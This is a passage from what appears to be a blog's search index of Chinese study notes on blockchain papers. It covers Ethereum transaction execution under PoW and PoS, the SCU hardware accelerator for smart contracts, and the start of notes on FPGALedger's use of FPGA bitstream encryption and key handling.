-\n<strong>扩展通信协议</strong>：确保网络中的其他节点可以理解 FPGA\n节点生成的结果和状态更新。 -\n<strong>动态调度</strong>：引入智能调度器，根据交易的复杂性动态分配任务给\nFPGA 节点或传统节点。</p>\n<h3 id=\"未来的发展\">5. <strong>未来的发展</strong></h3>\n<p>随着以太坊网络的升级（如以太坊 2.0 的 PoS 机制），FPGA\n节点的作用可能会进一步扩展。这可能包括专门设计的硬件加速器，用于验证新的共识机制或执行更加复杂的智能合约。</p>\n<h3 id=\"总结-1\">总结</h3>\n<p>FPGA 接入以太坊网络涉及将 FPGA\n节点作为专用加速器节点，并通过兼容性层与现有网络进行通信和集成。虽然需要对现有智能合约进行字节码转换，但通过有效的架构设计，FPGA\n可以显著提高智能合约的执行速度，并在整个网络中实现性能的提升。系统需要调整以支持这种异构环境，确保所有节点，无论是\nFPGA 还是传统 CPU，都能协同工作并达成共识。</p>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"以太坊1.0-事务执行过程\">以太坊1.0 事务执行过程</h2>\n<p>好的，下面是一个以太坊事务执行的完整过程的详细解释，从事务的创建到最终在区块链上确认。为了简化解释，我将基于以太坊\n1.0\n的流程进行说明，涉及工作量证明（PoW）机制下的矿工节点执行事务。如果你需要基于以太坊\n2.0（PoS）的说明，请告诉我。</p>\n<h3 id=\"事务的创建\">1. <strong>事务的创建</strong></h3>\n<ul>\n<li><strong>用户发起事务</strong>：以太坊用户通过钱包或其他应用创建一个事务。这可能是一个简单的以太币转账事务，也可能是调用一个智能合约。事务包括以下关键字段：\n<ul>\n<li><strong>发送者地址（From）</strong>：发起事务的账户地址。</li>\n<li><strong>接收者地址（To）</strong>：接收以太币或调用智能合约的地址。</li>\n<li><strong>金额（Value）</strong>：发送的以太币数量。</li>\n<li><strong>数据（Data）</strong>：如果调用智能合约，此字段包含合约的调用数据。</li>\n<li><strong>Gas限制（Gas Limit）</strong>：用户愿意为事务支付的最大 Gas\n数量。</li>\n<li><strong>Gas价格（Gas Price）</strong>：用户愿意支付的每单位 Gas\n的价格。</li>\n<li><strong>随机数（Nonce）</strong>：发送者账户已发送事务的计数器，以确保事务的唯一性。</li>\n<li><strong>签名（Signature）</strong>：事务经过发送者私钥的签名，用于验证发送者的身份。</li>\n</ul></li>\n</ul>\n<h3 id=\"事务的广播\">2. <strong>事务的广播</strong></h3>\n<ul>\n<li>用户在创建并签署事务后，将其广播到以太坊网络。事务首先被发送到邻近的节点，然后逐步传播到整个网络。</li>\n</ul>\n<h3 id=\"事务的接收与排队\">3. <strong>事务的接收与排队</strong></h3>\n<ul>\n<li><strong>节点接收事务</strong>：矿工节点和其他普通节点都会接收到该事务。节点会对事务进行初步验证，如检查事务的格式和签名是否正确，以及发送者账户是否有足够的余额支付此次事务及其\nGas 费用。</li>\n<li><strong>将事务加入待处理队列</strong>：通过初步验证的事务会被加入到节点的“事务池”（Transaction\nPool）中。事务池是节点存储待处理事务的地方。</li>\n</ul>\n<h3 id=\"区块的构建\">4. <strong>区块的构建</strong></h3>\n<ul>\n<li><strong>矿工选择事务</strong>：矿工节点从事务池中选择一组事务来构建新的区块。矿工通常会优先选择\nGas 价格较高的事务，因为他们的奖励取决于事务支付的 Gas 费用。</li>\n<li><strong>计算区块哈希（挖矿）</strong>：矿工开始为这个区块计算工作量证明（PoW），也就是“挖矿”。这是通过反复计算区块头的哈希值，直到找到一个满足当前难度目标的哈希值为止。这需要大量的计算能力。</li>\n</ul>\n<h3 id=\"区块的传播\">5. <strong>区块的传播</strong></h3>\n<ul>\n<li><strong>成功挖矿并传播区块</strong>：一旦矿工成功挖出了一个新区块，他们会将区块广播到整个网络。其他节点接收到该区块后，会进行验证，包括验证区块中的每个事务。</li>\n</ul>\n<h3 id=\"事务的验证与执行\">6. <strong>事务的验证与执行</strong></h3>\n<ul>\n<li><strong>节点验证区块</strong>：每个接收到新区块的节点会检查区块的有效性，包括：\n<ul>\n<li>区块头的哈希是否满足当前难度要求。</li>\n<li>区块中每个事务的签名是否有效。</li>\n<li>发送者账户的余额和随机数是否有效。</li>\n</ul></li>\n<li><strong>执行事务</strong>：如果区块通过了验证，节点将按顺序执行区块中的每个事务。这包括：\n<ul>\n<li>更新发送者和接收者的账户余额。</li>\n<li>如果事务涉及调用智能合约，节点会在以太坊虚拟机（EVM）中执行合约代码，更新合约的状态。</li>\n<li>扣除对应的 Gas 费用，并将剩余的 Gas 返还给发送者。</li>\n</ul></li>\n</ul>\n<h3 id=\"更新区块链状态\">7. <strong>更新区块链状态</strong></h3>\n<ul>\n<li><strong>区块链状态更新</strong>：执行完区块中的所有事务后，节点会将这些状态更新写入本地的区块链数据库。区块链的状态树（Merkle\nPatricia Tree）也会相应地更新。</li>\n<li><strong>新区块添加到区块链</strong>：最后，节点将新区块添加到区块链的末尾，并将此状态作为当前链的最新状态。</li>\n</ul>\n<h3 id=\"区块确认\">8. <strong>区块确认</strong></h3>\n<ul>\n<li><strong>确认过程</strong>：当后续区块被成功挖出并接入该区块之后，区块得到确认。通常，经过\n6 个区块的确认后，认为该区块以及其中的事务不可逆。</li>\n<li><strong>事务最终确认</strong>：当区块得到足够的确认后，用户和网络就认为事务已被永久记录在区块链上，并且事务的执行结果不可更改。</li>\n</ul>\n<h3 id=\"事务完成\">9. <strong>事务完成</strong></h3>\n<ul>\n<li><strong>用户查看结果</strong>：用户可以通过以太坊区块浏览器或钱包查看事务的执行状态、Gas\n消耗情况，以及是否成功完成。</li>\n</ul>\n<p>通过上述过程，用户发起的事务最终得以在区块链上确认，完成从事务创建到最终确认的全过程。这个流程确保了以太坊网络的安全性、不可篡改性和一致性。</p>\n<blockquote>\n<p>这个过程再细化一下，我有几个疑问：\n矿工节点肯定不止一个，这些矿工节点选取的一组事务一定都相同吗？有没有可能两个矿工节点内的数据不同，导致选择的事务不同，导致产生的区块不同或有重复的事务？</p>\n</blockquote>\n<p>你的疑问非常好，确实，在以太坊网络中，不同矿工节点可能选择不同的事务集来构建各自的区块，这可能导致两个矿工节点挖出的区块包含不同的事务。这种情况是完全可能的，也是区块链网络中的常见现象。让我们更详细地解释这一过程，并回答你的问题。</p>\n<h3 id=\"细化的事务执行过程\">细化的事务执行过程</h3>\n<h4 id=\"事务的创建与传播\">1. <strong>事务的创建与传播</strong></h4>\n<ul>\n<li>当用户创建并签署事务后，这些事务会被广播到以太坊网络中的多个节点。</li>\n<li>事务会进入每个接收到事务的节点的“事务池”（Transaction\nPool）中。这些事务池并不总是完全相同，因为网络延迟、节点处理能力等因素可能导致不同节点接收到的事务集略有不同。</li>\n</ul>\n<h4 id=\"矿工节点的事务选择\">2. <strong>矿工节点的事务选择</strong></h4>\n<ul>\n<li><strong>独立选择事务</strong>：每个矿工节点都会独立地从自己的事务池中选择要包含在新区块中的事务。矿工节点通常会优先选择\nGas 价格较高的事务，因为这些事务能为矿工带来更高的交易费收入。</li>\n<li><strong>不同节点选择不同事务</strong>：由于不同矿工节点的事务池可能不完全相同，加上矿工的选择策略不同，两个矿工节点选取的事务集可能会有所不同。这就可能导致矿工节点创建的区块包含不同的事务，或者包含一些相同的事务，但顺序不同。</li>\n</ul>\n<h4 id=\"区块的产生\">3. <strong>区块的产生</strong></h4>\n<ul>\n<li><strong>可能的区块分叉</strong>：如果两个矿工几乎在同一时间挖出新区块，这两个区块可能包含不同的事务，并同时向网络广播。这种情况称为“区块分叉”（block\nfork）。网络中的其他节点可能会暂时接收到两个不同的区块，并各自延续出不同的链。</li>\n</ul>\n<h4 id=\"区块链的共识机制\">4. <strong>区块链的共识机制</strong></h4>\n<ul>\n<li><strong>链的延展与选择</strong>：区块链的共识机制规定，最长链（即包含最多累积工作量的链）最终会被认为是“主链”。因此，网络中的节点会继续在这两个分叉链上进行挖矿，直到其中一条链变得更长，其他矿工会放弃较短的链。</li>\n<li><strong>重复事务的处理</strong>：如果分叉链中的一个区块已经包含了某个事务，而另一个分叉链中的区块也包含了这个事务，当最终只有一条链被保留时，重复的事务只会被处理一次。区块链是防篡改的，这意味着一旦事务被记录在区块中并得到确认，就不可能再次被处理。</li>\n</ul>\n<h4 id=\"分叉的解决\">5. <strong>分叉的解决</strong></h4>\n<ul>\n<li><strong>孤块（Orphan\nBlock）</strong>：在共识机制的作用下，较短的分叉链最终会被丢弃，其上的区块称为“孤块”。在孤块中的事务如果没有在主链的其他区块中被处理，它们会重新回到事务池中，等待被下一个区块处理。</li>\n</ul>\n<h3 id=\"总结-2\">总结</h3>\n<ul>\n<li><strong>事务选择的独立性</strong>：不同的矿工节点可以选择不同的事务集，这取决于它们各自的事务池和选择策略。这会导致不同矿工挖出不同的区块。</li>\n<li><strong>重复事务的处理</strong>：即使有不同矿工挖出包含相同事务的区块，最终的共识机制会确保事务只在最终确认的链上被处理一次。</li>\n<li><strong>分叉的解决</strong>：区块链通过最长链共识机制解决分叉问题，确保网络最终一致。</li>\n</ul>\n<p>通过这些机制，以太坊网络能够有效应对不同矿工节点选择不同事务集以及潜在的区块分叉问题，确保整个网络的安全性和一致性。</p>\n<h2 id=\"以太坊2.0-事务执行过程\">以太坊2.0 事务执行过程</h2>\n<p>在以太坊 2.0 中，事务执行的过程与以太坊 1.0\n有一些关键的不同，特别是在共识机制和节点类型上。以太坊 2.0\n采用了权益证明（Proof of Stake,\nPoS）共识机制，验证者节点（Validators）取代了矿工节点，负责验证和提议区块。下面是以太坊\n2.0 中一个事务执行的完整过程：</p>\n<h3 id=\"事务的创建-1\">1. <strong>事务的创建</strong></h3>\n<ul>\n<li><strong>用户发起事务</strong>：与以太坊 1.0\n类似，用户通过钱包或其他应用创建一个事务，这可能是以太币转账或智能合约调用。事务的基本构成包括发送者地址、接收者地址、金额、Gas\n限制、Gas 价格、随机数和签名。</li>\n</ul>\n<h3 id=\"事务的广播-1\">2. <strong>事务的广播</strong></h3>\n<ul>\n<li>用户创建并签署事务后，将其广播到以太坊网络。事务会传播到网络中的多个验证者节点和其他普通节点。</li>\n</ul>\n<h3 id=\"事务的接收与验证\">3. <strong>事务的接收与验证</strong></h3>\n<ul>\n<li><strong>节点接收事务</strong>：验证者节点接收到事务后，会进行初步验证，例如检查事务的格式、签名的有效性、发送者账户的余额是否足够支付此次事务和相关费用。</li>\n<li><strong>事务池</strong>：通过初步验证的事务会进入验证者节点的事务池，等待进一步处理。</li>\n</ul>\n<h3 id=\"验证者节点的选取\">4. <strong>验证者节点的选取</strong></h3>\n<ul>\n<li><strong>验证者提议区块</strong>：在 PoS\n共识机制下，验证者节点会根据其质押的以太币数量被随机选中提议新区块。这个选择过程是由协议自动执行的，质押越多，被选中的概率越高。</li>\n<li><strong>创建新区块</strong>：被选中的验证者从事务池中挑选事务并打包成新区块。与\nPoW 中矿工优先选择高 Gas\n费用的事务类似，验证者也可能会选择能够带来更高收益的事务。</li>\n</ul>\n<h3 id=\"区块的提议与传播\">5. <strong>区块的提议与传播</strong></h3>\n<ul>\n<li><strong>提议区块</strong>：被选中的验证者创建新区块后，会将这个区块广播到整个网络。其他验证者节点接收到该区块后，开始进行验证。</li>\n<li><strong>快速验证与投票</strong>：其他验证者节点会检查新区块的有效性，包括事务的合法性、区块头信息的正确性等。如果验证通过，这些验证者会通过“投票”来确认该区块。验证者的投票权重取决于他们质押的以太币数量。</li>\n</ul>\n<h3 id=\"共识达成\">6. <strong>共识达成</strong></h3>\n<ul>\n<li><strong>拜占庭容错机制（BFT）</strong>：以太坊 2.0\n的共识协议基于拜占庭容错机制，通常是 LMD-GHOST 和 Casper FFG\n的组合。验证者节点通过投票达成共识，如果超过 2/3\n的验证者同意一个区块，那么这个区块就被确认。</li>\n<li><strong>最终确定性</strong>：以太坊 2.0\n引入了“最终性检查点”（Finality\nCheckpoint）机制，区块链会定期产生最终性检查点，并由验证者投票确认。被确认的区块和之前的区块都会被认为是不可逆的。</li>\n</ul>\n<h3 id=\"事务的执行与状态更新\">7.\n<strong>事务的执行与状态更新</strong></h3>\n<ul>\n<li><strong>事务执行</strong>：一旦区块被提议并得到足够的投票确认，验证者节点会执行区块中的每个事务。这包括更新账户余额、执行智能合约代码以及更新区块链的状态树。</li>\n<li><strong>状态更新</strong>：验证者节点会更新其本地的区块链状态，包括账户的余额变化和智能合约的状态变化。</li>\n</ul>\n<h3 id=\"新区块的添加\">8. <strong>新区块的添加</strong></h3>\n<ul>\n<li><strong>添加到区块链</strong>：区块在得到足够确认后，正式被添加到区块链的主链上。此时，该区块中的所有事务被视为最终确定，无法更改。</li>\n</ul>\n<h3 id=\"事务完成-1\">9. <strong>事务完成</strong></h3>\n<ul>\n<li><strong>用户查看结果</strong>：用户可以通过以太坊区块浏览器或钱包查看事务的状态和执行结果，包括\nGas 消耗情况和是否成功执行。</li>\n</ul>\n<h3 id=\"关键点总结\">关键点总结</h3>\n<ul>\n<li><strong>验证者的选取与投票</strong>：以太坊 2.0 的 PoS\n共识机制通过随机选取验证者来提议区块，并通过其他验证者的投票来确认区块的合法性。</li>\n<li><strong>最终性机制</strong>：通过最终性检查点机制，确保被确认的区块无法回滚，增强了区块链的安全性和确定性。</li>\n<li><strong>事务执行的高效性</strong>：相比 PoW，PoS\n不需要大量的计算资源，更加节能环保，并且能够实现更快的事务处理速度。</li>\n</ul>\n<p>通过这些步骤，以太坊 2.0\n实现了高效的事务处理和共识达成，确保了网络的安全性、可扩展性和最终性。</p>\n<h1 id=\"简介\">1 简介</h1>\n<p>本文提出了 SCU （Smart Contract\nUnit），在硬件层面并行加速以太坊上智能合约的执行效率。</p>\n<p>优化措施：</p>\n<ul>\n<li>指令级并行\n<ul>\n<li>EVM → 动态流水线（和传统的CPU设计类似）</li>\n<li>EVM指令集 → 精简指令集（RISC-V）</li>\n</ul></li>\n<li>事务级并行\n<ul>\n<li>两步验证（验证并行的事务是否存在冲突）</li>\n<li>事务可以同时在异构多核的芯片上运行\n<ul>\n<li>异构事务调度算法</li>\n</ul></li>\n</ul></li>\n<li>热点合约、事务\n<ul>\n<li>根据热点设置可配置单元</li>\n<li>根据热点设置共享缓存块</li>\n</ul></li>\n</ul>\n<h1 id=\"指令集并行-1\">2 指令集并行</h1>\n<h2 id=\"evm的缺陷\">2.1 EVM的缺陷</h2>\n<ol type=\"1\">\n<li><p>基于一个软件虚拟机。</p>\n<p>几乎没有并行性，CPU利用率通常约为10%。</p></li>\n<li><p>基于栈的执行模型。</p>\n<p>所有中间结果和操作数都需要压入栈、只能读栈顶的值……有很多额外开销。</p></li>\n<li><p>不定长指令。</p>\n<p>导致必须解析指令才能确定指令长度，无法应用传统的流水线。</p></li>\n</ol>\n<h2 id=\"基于寄存器的risc\">2.2 基于寄存器的RISC</h2>\n<p><strong>32个</strong> <strong>256位</strong>\n的寄存器，代替操作数栈</p>\n<ul>\n<li>256位的宽度是因为它与以太坊中使用的哈希值长度一致，也是以太坊整体设计中定义的最长值。</li>\n<li>虽然以太坊原始的栈深度为1000项，但实际上很少会使用超过32项。即使遇到罕见情况，系统将会等待已占用的寄存器释放，也不会影响系统正确性。</li>\n</ul>\n<h2 id=\"scu-执行模型\">2.3 SCU 执行模型</h2>\n<figure>\n<img src=\"/blockchain/paper-SCU/image-20240825220348346.png\" alt=\"image-20240825220348346\">\n<figcaption aria-hidden=\"true\">image-20240825220348346</figcaption>\n</figure>\n<ol type=\"1\">\n<li>从指令缓冲区获取代码，并将其放入窗口大小为32的指令队列（IQ）条目中。</li>\n<li>解码器将解码字节码，并将指令转换为我们的SCU ISA指令。</li>\n<li>当指令被发射到保留站时，将应用寄存器重命名方法，进一步消除不必要的寄存器依赖关系。</li>\n<li>当所需的操作数和执行单元准备好后，保留站会将待处理的指令分派到相应的目标执行单元。</li>\n<li>每个执行单元将进行相应的操作，结果将写入公共数据总线（CDB），以更新保留站和重排序缓冲区（ROB）。</li>\n<li>由于第2到第5步的执行顺序可以是乱序的，我们在第6步使用顺序提交来最终确定对寄存器文件、内存和本地存储缓冲区的更改。</li>\n<li>生成EVM收据并将其写回本地存储，这用于在执行结束时生成输出集。</li>\n</ol>\n<p>非常类似于传统的流水线CPU。</p>\n<h2 id=\"可配置单元\">2.4 可配置单元</h2>\n<p>图2中加粗黑框的部分。</p>\n<p>通过为SCU执行引擎配备额外的单元，以避免潜在的结构性冲突并进一步提升性能。</p>\n<p>如何确定可配置单元数量以最优整体性能？</p>\n<ol type=\"1\">\n<li><strong>分析目标智能合约</strong>\n<ul>\n<li>对目标智能合约进行剖析，获取其指令拆解，即每种类型的指令在我们ISA中的比例。</li>\n</ul></li>\n<li><strong>分配额外功能单元</strong>\n<ul>\n<li>根据每种指令类型的流行程度，分配额外的功能单元。</li>\n<li>常用的指令类型将配备更多的执行单元。</li>\n</ul></li>\n<li><strong>配置监控与调整</strong> <em>（人工实验判断）</em>\n<ul>\n<li>监控新配置的效果，特别是额外资源的使用情况。</li>\n<li>如果额外资源的利用率低于硬件成本增加的比例，则停止添加功能单元。</li>\n</ul></li>\n<li><strong>优化与终止</strong>\n<ul>\n<li>基于监控结果，确定是否需要继续调整或停止添加单元。</li>\n<li>通过简单的启发式方法<em>（没有具体描述）</em>，在不进行全面设计空间探索的情况下，实现性能优化。</li>\n</ul></li>\n<li><strong>验证性能提升</strong>\n<ul>\n<li>通过实验验证优化后的配置能否带来显著的性能提升（将在第6节中展示）。</li>\n</ul></li>\n</ol>\n<blockquote>\n<p>纯人工反复实验来选择可配置单元，效率不高，并且可能对于某些智能合约效果不好</p>\n</blockquote>\n<h1 id=\"事务级并行-1\">3 事务级并行</h1>\n<p>区块链被调用执行的智能合约代码都是一个个事务。好几个事务打包成一个区块，当区块被确认加入到区块链上后，会执行该区块中的所有事务。</p>\n<p>在以太坊设计中，事务必须按照它们在区块中出现的顺序执行。这是因为如果事务的执行顺序错误，可能会破坏事务之间的潜在<strong>数据依赖性</strong>。</p>\n<p>例如，一个事务可能会修改他所在合约中的状态变量，而下一个事务需要使用这个状态变量进行一些判断。</p>\n<p>为了使得事务可以并行运行，本文提出了两种技术：两步验证和异构多核设计。</p>\n<h2 id=\"两步验证-1\">3.1 两步验证</h2>\n<p>两步验证，定义了两个可以并行执行的验证过程：执行验证与状态验证</p>\n<ul>\n<li><p><strong>执行验证</strong>：为了检查EVM在给定交易及其输入状态下的执行结果是否正确。</p>\n<p>文中并没有具体描述如何进行检查，我认为就是指执行事务的这个过程。</p></li>\n<li><p><strong>状态验证</strong>：检查输入集和输出集的正确性。只有当输入集和输出集都有效时，状态才被认为是有效的。</p></li>\n</ul>\n<blockquote>\n<p>输入集(IS)：事务需要访问的状态变量</p>\n<p>输出集(OS)：事务需要修改的状态变量</p>\n</blockquote>\n<h2 id=\"流程\">3.2 流程</h2>\n<figure>\n<img src=\"/blockchain/paper-SCU/image-20240903150318550.png\" alt=\"image-20240903150318550\">\n<figcaption aria-hidden=\"true\">image-20240903150318550</figcaption>\n</figure>\n<ol type=\"1\">\n<li><p>将区块中的事务按顺序排列。输入集送入状态验证器。</p></li>\n<li><p>将智能合约的代码加入共享缓存。（缓存中存放热点智能合约代码）</p></li>\n<li><p>将验证事务分派给各个执行核心。输入集由状态验证器提供。</p></li>\n<li><p>执行完成后，输出集被写入状态验证器。</p></li>\n<li><p>在上述流程同时，使用来自Tx\nScheduler的调度映射（箭头5）确认需要验证的内容，并访问全局数据库进行验证。</p>\n<p>每个交易验证通过后，都修改状态验证器里的数据存储。</p></li>\n<li><p>当全部验证通过，更新全局数据库。</p></li>\n</ol>\n<h2 id=\"异构多核架构-1\">3.3 异构多核架构</h2>\n<figure>\n<img src=\"/blockchain/paper-SCU/image-20240903164042302.png\" alt=\"image-20240903164042302\">\n<figcaption aria-hidden=\"true\">image-20240903164042302</figcaption>\n</figure>\n<p>每个圈都是事务，左上角是编号，圈内的数字是执行这个事务所需的时间。</p>\n<p>首先找出各个事务之间的依赖链（DC），如图a。</p>\n<p>图c是两个相同的多核。首先把DC1和DC2放到Q1和Q2中。接下来要选一个队列放DC3。</p>\n<p>选择队列中当前权重最小的，所以DC3放到Q2中。同理，DC4放到Q2中。</p>\n<p>图d是异构架构，一个大核两个小核，大核执行时间是小核的一半。</p>\n","categories":["笔记"],"tags":["区块链","以太坊","智能合约","论文"]},{"title":"FPGA based Decentralized Ledger for Enterprise Applications 论文笔记","url":"/blockchain/paper-FPGALedger/","content":"<p>随着区块链和去中心化账本的广泛应用，为了降低技术负担，提出了区块链即服务（Blockchain-as-a-Service，BaaS）的概念，将区块链托管在云端。类似于函数及服务等云服务。</p>\n<p>但是这种方式带来了安全问题。本文提出了一种基于FPGA的企业应用去中心化账本，利用FPGA的安全特性来防止未经授权的数据访问。</p>\n<span id=\"more\"></span>\n<h1 id=\"简介\">1 简介</h1>\n<h2 id=\"主要贡献\">1.1 主要贡献</h2>\n<p>本文提出了FPGALedger，利用现代FPGA的安全特性，如比特流加密和防篡改功能，防止攻击者（例如云服务提供商的恶意管理员）从去中心化账本应用程序中获取敏感信息和/或影响应用程序的执行过程。总之，我们的贡献有两方面：</p>\n<ul>\n<li>我们提出了<strong>FPGALedger的架构</strong>、不同参与者之间的<strong>详细协议</strong>，并分析其安全特性；</li>\n<li>我们使用现成的FPGA实现了<strong>FPGALedger的关键组件</strong>，并评估其性能以证明其实际可行性。</li>\n</ul>\n<h2 id=\"fpga-的安全特性\">1.2 FPGA 的安全特性</h2>\n<p>FPGA 的安全特性可以整理如下：</p>\n<ol type=\"1\">\n<li><strong>防篡改技术（Anti-Tamper, AT）</strong>：\n<ul>\n<li>防止逆向工程：通过使电路设计更加难以分析，阻止外部对FPGA的逆向工程。</li>\n<li>防止系统能力修改：确保FPGA的配置和功能不会被非法篡改或修改。</li>\n<li>阻止对策开发：通过复杂的设计和保护措施，防止开发针对FPGA安全的攻击性对策。</li>\n</ul></li>\n<li><strong>防篡改涂层技术</strong>：\n<ul>\n<li>物理防护：通过涂层技术，保护FPGA免受物理攻击，如探针攻击或微探针侵入。</li>\n</ul></li>\n<li><strong>比特流加密机制</strong>：\n<ul>\n<li><strong>保密性</strong>：使用AES加密技术对比特流进行加密，确保在FPGA上运行的程序不会被未授权方读取或篡改。</li>\n<li><strong>完整性</strong>：使用HMAC（哈希消息认证码）来验证比特流的完整性，防止未经授权的修改。</li>\n<li><strong>根信任</strong>：通过工厂预置的密钥材料，如物理不可克隆函数（PUF），与非对称加密技术协调工作，确保加密过程的安全性和可靠性。</li>\n</ul></li>\n<li><strong>物理不可克隆函数（Physically Unclonable Function,\nPUF）</strong>：\n<ul>\n<li>工厂预置的密钥材料：作为根信任的一部分，PUF利用FPGA芯片的物理特性生成独特的、不可克隆的密钥。</li>\n<li>安全密钥存储：PUF生成的密钥用于保护比特流和其他敏感数据，防止其被复制或篡改。</li>\n</ul></li>\n</ol>\n<p>这些安全特性使FPGA在云环境中进行大规模数据处理和执行敏感任务时，能够提供高水平的安全保障。</p>\n<figure>\n<img src=\"/blockchain/paper-FPGALedger/image-20240904122454798.png\" alt=\"image-20240904122454798\">\n<figcaption aria-hidden=\"true\">image-20240904122454798</figcaption>\n</figure>\n<p><strong>FPGA Boot Image</strong>（FPGA启动镜像）：</p>\n<ul>\n<li><strong>HMAC Authenticated\nImage</strong>（HMAC认证的镜像）：用户准备好比特流后，通过AES（高级加密标准）进行加密，并生成相应的HMAC（哈希消息认证码）签名。HMAC用于确保比特流在传输和存储过程中未被篡改。</li>\n<li><strong>AES Encrypted\nBitstream</strong>（AES加密的比特流）：这个比特流是经过AES加密的，确保在传输和存储时的数据保密性。</li>\n<li><strong>HMAC\nSignature</strong>（HMAC签名）：这是由HMAC生成的签名，用于验证比特流的完整性和真实性。</li>\n</ul>\n<p><strong>Hard-wired System</strong>（硬件系统）：</p>\n<ul>\n<li><strong>Secure\nVault</strong>（安全保险库）：FPGA设备内置了一个安全保险库，用于存储公钥/私钥对或其他关键材料，如eFUSE密钥或BBRAM（电池备份RAM）密钥。这些密钥用于解密和验证比特流。</li>\n<li><strong>HMAC\nAuthentication</strong>（HMAC认证）：在加载比特流之前，硬件首先通过HMAC认证，确认比特流未被篡改。如果认证成功，比特流会被传递到AES解密器。</li>\n<li><strong>AES</strong>（AES解密器）：在HMAC认证成功后，AES密钥会被传递到硬件AES解密器，用于解密比特流。解密后的比特流将被部署到FPGA的可编程逻辑中。</li>\n</ul>\n<p><strong>Interconnection Network and Programmable\nLogic</strong>（互连网络与可编程逻辑）：</p>\n<ul>\n<li>解密后的比特流通过内部互连网络加载到FPGA的可编程逻辑中，FPGA根据比特流的指令配置相应的功能。</li>\n</ul>\n<h1 id=\"fpga-ledger的设计\">2 FPGA Ledger的设计</h1>\n<h2 id=\"总览\">2.1 总览</h2>\n<p>有三个组成部分：</p>\n<ul>\n<li><p>云服务提供商</p>\n<p>云服务提供商提供基础设施，包含很多FPGA设备、存储系统和网络。</p></li>\n<li><p>FPGA设备</p>\n<p>FPGA设备作为分布式账本的节点，负责区块链管理和智能合约的执行。每个\nFPGA\n设备都有自己的一对公钥/私钥，并支持防篡改技术，包括比特流保护机制。</p></li>\n<li><p>用户</p>\n<p>用户是基于去中心化账本应用的一方，通常是一个组织。每个用户控制云中的一个或多个\nFPGA 设备，与其他参与者进行交互。</p></li>\n</ul>\n<figure>\n<img src=\"/blockchain/paper-FPGALedger/image-20240904123850602.png\" alt=\"image-20240904123850602\">\n<figcaption aria-hidden=\"true\">image-20240904123850602</figcaption>\n</figure>\n<ol type=\"1\">\n<li><strong>输入（Input）</strong>：\n<ul>\n<li>输入部分包含三个主要内容：\n<ul>\n<li><strong>Contract ID（合约 ID）</strong>：智能合约的唯一标识符。</li>\n<li><strong>Current\nState（当前状态）</strong>：合约当前的执行状态。</li>\n<li><strong>Smart\nContract（智能合约）</strong>：具体的智能合约代码。</li>\n</ul></li>\n</ul></li>\n<li><strong>比特流（Bitstream）</strong>：\n<ul>\n<li><strong>DMA（直接内存访问）</strong>：用于快速传输数据，通常用于将数据从输入设备传输到处理器或者从处理器传输到输出设备。</li>\n<li><strong>Input\nDecryptor（输入解密器）</strong>：解密输入的智能合约和状态数据，以确保其在\nFPGA 内部的处理是安全的。</li>\n<li><strong>Smart Contract\nInterpreter（智能合约解释器）</strong>：负责解释和执行智能合约代码。</li>\n<li><strong>Support\nFunctions（支持功能）</strong>：包括数字签名生成/验证、一致性机制、I/O\n操作等辅助功能。</li>\n<li><strong>Output\nEncryptor（输出加密器）</strong>：对输出的结果进行加密，以确保结果在传输和存储过程中保持机密性。</li>\n</ul></li>\n<li><strong>输出（Output）</strong>：\n<ul>\n<li><strong>Accept/Reject（接受/拒绝）</strong>：智能合约执行后的结果，决定是否接受或拒绝某个操作。</li>\n<li><strong>Attestation of\nCorrectness（正确性证明）</strong>：提供执行过程的正确性证明。</li>\n<li><strong>State\nDelta（状态变化）</strong>：描述执行智能合约后系统状态的变化。</li>\n</ul></li>\n</ol>\n<ul>\n<li><strong>用户（User）</strong>：用户通常是企业组织，他们租用 FPGA\n设备来维护和使用去中心化账本。</li>\n<li><strong>云服务提供商（Cloud Service Provider, CSP）</strong>：CSP\n负责管理多个 FPGA 设备，为企业用户提供服务。FPGA\n设备在云环境中解释和执行智能合约，而不会泄露与合约及相关交易的信息。</li>\n</ul>\n<p>总结一下，就是所有输入内容、输出内容和比特流中的所有内容都是加密的，其他人无法看到。</p>\n<h2 id=\"详细设计\">2.2 详细设计</h2>\n<p>主要设计内容是，用户和FPGA之间、FPGA和FPGA之间如何加密传输数据。</p>\n<p>用到了两个秘钥：</p>\n<p><strong>密钥对（公钥/私钥）</strong>：</p>\n<ul>\n<li>每个 FPGA\n设备都有一对唯一的公钥和私钥，其中私钥嵌入在比特流中并加载到设备内，公钥则以证书的形式发布。</li>\n<li>私钥用于解密智能合约提交时附带的加密信息（例如，对称密钥），确保只有指定的\nFPGA 设备可以解密并处理这些信息。</li>\n<li>通过私钥的使用，FPGA\n设备能够恢复并解密智能合约的内容，同时确保私钥不暴露给外部。</li>\n</ul>\n<p><strong>对称密钥（<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.355ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.117ex\" height=\"1.926ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 935.6 851.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(554,-150) scale(0.707)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 